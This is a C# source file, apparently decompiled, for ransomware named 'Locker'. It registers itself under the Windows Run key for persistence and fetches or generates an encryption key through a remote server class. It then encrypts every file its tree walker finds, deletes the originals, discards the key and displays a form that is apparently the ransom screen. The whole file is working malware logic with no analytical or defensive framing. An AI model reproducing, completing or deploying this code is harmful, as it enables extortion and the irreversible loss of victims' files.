using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Locker;

internal static class Program
{
	public static string appGuid = "9617c104-8052-4ded-ab6a-094f91c693d7";

	public static NameValueCollection status = new NameValueCollection();

	public static Server server;

	private static TreeWalker walker;

	private static AutoResetEvent _resetEvent = new AutoResetEvent(initialState: false);

	[STAThread]
	private static void Main()
	{
		AddToStartup();
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Mutex mutex = new Mutex(initiallyOwned: false, appGuid);
		if (!mutex.WaitOne(0, exitContext: false))
		{
			Environment.Exit(0);
		}
		BackgroundWorker backgroundWorker = new BackgroundWorker();
		backgroundWorker.DoWork += bw_DoWork;
		backgroundWorker.RunWorkerAsync();
		_resetEvent.WaitOne();
		if (walker.FileCount > 0)
		{
			Application.Run((Form)(object)new frmMain());
		}
		else
		{
			RemoveFromStartup();
		}
	}

	private static void bw_DoWork(object sender, DoWorkEventArgs e)
	{
		server = new Server();
		status = server.GetStatus();
		walker = new TreeWalker();
		walker.Search();
		if (status["status"] == "unlocked")
		{
			EncryptionKey key = server.GetKey();
			if (key == null)
			{
				key = new EncryptionKey(GenerateFriendlyPassword(32), GenerateFriendlyPassword(16));
				server.SetKey(key);
			}
			walker.Crypt();
			server.Lock();
			server.DisposeKey();
			walker.RemoveFiles();
		}
		_resetEvent.Set();
	}

	private static string GenerateFriendlyPassword(int length)
	{
		char[] array = new char[64]
		{
			'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
			'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T',
			'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd',
			'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
			'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
			'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7',
			'8', '9', '-', '_'
		};
		char[] array2 = new char[length];
		byte[] array3 = new byte[length];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array3);
		for (int i = 0; i < array2.Length; i++)
		{
			int num = (int)array3[i] % array.Length;
			array2[i] = array[num];
		}
		return new string(array2);
	}

	public static void AddToStartup()
	{
		try
		{
			Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "CLock", "\"" + Assembly.GetExecutingAssembly().Location + "\"");
		}
		catch (Exception)
		{
		}
	}

	public static void RemoveFromStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.DeleteValue("CLock");
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}
}
